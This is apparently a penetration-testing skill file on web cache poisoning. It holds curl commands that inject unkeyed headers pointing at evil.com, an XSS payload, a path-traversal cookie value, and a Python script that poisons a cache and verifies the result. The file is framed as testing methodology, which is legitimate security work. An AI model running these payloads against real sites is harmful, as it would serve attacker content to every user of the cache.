---
name: cache-poisoning
description: Web cache poisoning and deception attacks targeting CDNs, reverse proxies, and application-level caches via unkeyed inputs
---

# Cache Poisoning

Cache poisoning exploits the gap between what a cache uses as its key (URL, Host) and unkeyed inputs (headers, cookies, query params) that influence the response content. A poisoned cache serves attacker-controlled content to all subsequent users requesting the same URL.

## Attack Surface

- Any application fronted by CDN (Cloudflare, Akamai, Fastly, CloudFront, Varnish)
- Reverse proxy caches (Nginx proxy_cache, Apache mod_cache, Squid)
- Application-level caches (Redis, Memcached caching rendered pages)
- Static asset CDNs caching JS/CSS files

## Reconnaissance

### Detection Signals

```bash
# Identify cache presence
curl -sI https://TARGET | grep -iE "x-cache|cf-cache-status|x-varnish|age|x-served-by|x-cdn|via|fastly"

# Check cache behavior — repeated requests should show Age increasing or X-Cache: HIT
for i in 1 2 3; do
  curl -sI "https://TARGET/static/main.js" | grep -iE "x-cache|age|cf-cache"
  sleep 1
done

# Identify cache key components
curl -sI "https://TARGET/?cachebuster=$(date +%s)" | grep -iE "x-cache"  # MISS = query is keyed
curl -sI "https://TARGET/" -H "X-Custom: test" | grep -iE "x-cache"     # HIT = header is unkeyed
```

## Key Vulnerabilities

### Unkeyed Header Poisoning

```bash
# X-Forwarded-Host — most common poisoning vector
curl -sk "https://TARGET/" -H "X-Forwarded-Host: evil.com" | grep "evil.com"
curl -sk "https://TARGET/" -H "X-Forwarded-Host: evil.com" -H "X-Forwarded-Scheme: http"

# X-Host / X-Original-URL
curl -sk "https://TARGET/" -H "X-Host: evil.com" | grep "evil.com"
curl -sk "https://TARGET/" -H "X-Original-URL: /admin" | grep -i admin

# X-Forwarded-Proto — force HTTP redirect loops or mixed content
curl -sk "https://TARGET/" -H "X-Forwarded-Proto: http" -D - -o /dev/null

# X-Forwarded-Port
curl -sk "https://TARGET/" -H "X-Forwarded-Port: 1337" | grep "1337"

# X-Rewrite-URL / X-Original-URL (IIS specific)
curl -sk "https://TARGET/" -H "X-Rewrite-URL: /admin/panel"
curl -sk "https://TARGET/" -H "X-Original-URL: /admin/panel"
```

### Fat GET Poisoning

```bash
# Some frameworks process GET request body — caches ignore it (unkeyed)
curl -sk "https://TARGET/page" -X GET -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=malicious_value" | grep "malicious_value"

# If reflected, subsequent GET /page requests serve poisoned content
```

### Unkeyed Cookie Poisoning

```bash
# Test if cookies influence response but aren't part of cache key
curl -sk "https://TARGET/" -H "Cookie: language=en" | md5sum
curl -sk "https://TARGET/" -H "Cookie: language=../../../../etc/passwd" | md5sum
# Different hashes = cookie influences response = potential poisoning vector
```

### Cache Key Normalization Attacks

```bash
# Port-based: cache may normalize away port
curl -sk "https://TARGET:443/" -H "Host: TARGET" | grep "something"
curl -sk "https://TARGET/" -H "Host: TARGET:1337" | grep "something"

# Path normalization differences
curl -sk "https://TARGET/./page" | md5sum
curl -sk "https://TARGET/page" | md5sum
# Same content but different cache keys = cache poisoning vector

# Query param ordering
curl -sk "https://TARGET/?a=1&b=2" | md5sum
curl -sk "https://TARGET/?b=2&a=1" | md5sum
```

### Practical Poisoning Attack

```python
import requests, time

target = "https://TARGET"
poison_header = "X-Forwarded-Host"
evil_domain = "evil.com"
cachebuster = f"?cb={int(time.time())}"

# Step 1: Send poisoned request to cache a malicious response
url = f"{target}/static/main.js{cachebuster}"
r = requests.get(url, headers={poison_header: evil_domain}, verify=False)
print(f"Poison sent: {r.status_code}")
print(f"X-Cache: {r.headers.get('X-Cache', 'N/A')}")

# Step 2: Verify — send CLEAN request, check if poison is served
time.sleep(1)
r2 = requests.get(url, verify=False)
if evil_domain in r2.text:
    print(f"[VULN] Cache poisoned! Evil domain '{evil_domain}' in cached response")
    print(f"X-Cache: {r2.headers.get('X-Cache', 'N/A')}")
else:
    print("Cache not poisoned or header is keyed")
```

## Advanced Techniques

### Resource Import Poisoning (Stored XSS via Cache)

```bash
# If X-Forwarded-Host is reflected in script/link tags:
# <script src="https://X-Forwarded-Host/static/main.js">
# Poison it to load XSS from attacker server

curl -sk "https://TARGET/" -H "X-Forwarded-Host: evil.com" | grep -oP 'src="[^"]*"'
# If src contains evil.com → cache this, all users load attacker's JS
```

### Parameter Cloaking

```bash
# Some caches parse query params differently than backend
# utm_content is often unkeyed by cache but processed by backend
curl -sk "https://TARGET/page?utm_content=<script>alert(1)</script>" | grep "script"

# Semicolon vs ampersand parsing differences
curl -sk "https://TARGET/page?innocent=1;evil=<script>alert(1)</script>"
```

### Vary Header Exploitation

```bash
# Check Vary header — tells cache which headers are keyed
curl -sI https://TARGET | grep -i "vary"
# Vary: Accept-Encoding, Cookie
# Headers NOT in Vary are unkeyed → poisoning candidates

# Common unkeyed headers to test:
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Proto" "X-Forwarded-Port" \
  "X-Original-URL" "X-Rewrite-URL" "X-Custom-IP-Authorization" "True-Client-IP" \
  "X-Real-IP" "CF-Connecting-IP" "Fastly-Client-IP"; do
  echo "--- Testing: $header ---"
  curl -sk "https://TARGET/?cb=$(date +%s)" -H "$header: INJECTED" | grep -c "INJECTED"
done
```

## Testing Methodology

1. **Confirm cache exists** — look for X-Cache, Age, cf-cache-status headers
2. **Identify cache key** — use cachebuster params, test which inputs are keyed vs unkeyed
3. **Scan unkeyed headers** — fuzz headers with param-miner or manual list, check if value appears in response
4. **Test reflection** — any unkeyed input reflected in response = poisoning candidate
5. **Poison with cachebuster** — always use a unique query param to avoid poisoning real traffic
6. **Verify persistence** — clean request should return poisoned content (X-Cache: HIT)
7. **Demonstrate impact** — XSS via poisoned JS imports, redirect loops, or content manipulation

## Validation

1. Clean request returns content containing attacker-controlled string (from unkeyed header)
2. X-Cache shows HIT on clean request — confirms cache is serving poisoned content
3. Multiple independent clients receive poisoned response for same URL
4. Demonstrate XSS execution via poisoned cached response

## False Positives

- Header is reflected but IS part of cache key (Vary header includes it)
- Cache TTL is very short (< 1 second) — not practically exploitable
- Response is user-specific (Vary: Cookie) — cannot poison for other users
- CDN is in pass-through mode (no caching) for the tested path

## Impact

- **Critical**: Stored XSS at scale — serve attacker JS to all users via poisoned CDN cache
- **High**: Redirect poisoning — force all users to attacker-controlled domain
- **High**: DoS via cache — cache error responses or redirect loops
- **Medium**: Information disclosure via cache — serve authenticated content to unauthenticated users

## Pro Tips

1. Always use cachebuster query params (`?cb=TIMESTAMP`) to avoid poisoning production traffic
2. X-Forwarded-Host is the #1 most common poisoning vector — test it first
3. Check `Vary` header to understand what's keyed — anything NOT in Vary is a candidate
4. Cloudflare, Akamai, Fastly all handle cache keys differently — research CDN-specific behavior
5. Fat GET requests are underrated — many frameworks process GET body but caches ignore it
6. Test both HTML pages and static assets (JS/CSS) — static assets are often cached more aggressively
7. Parameter cloaking with semicolons works against Ruby/Java backends behind most CDNs
8. If the cache key includes query params, try param pollution: `?param=clean&param=evil`
9. Look for `<link>`, `<script>`, `<meta>` tags that include header-derived values — these are XSS sinks
10. Cache poisoning + request smuggling can be chained for devastating compound attacks
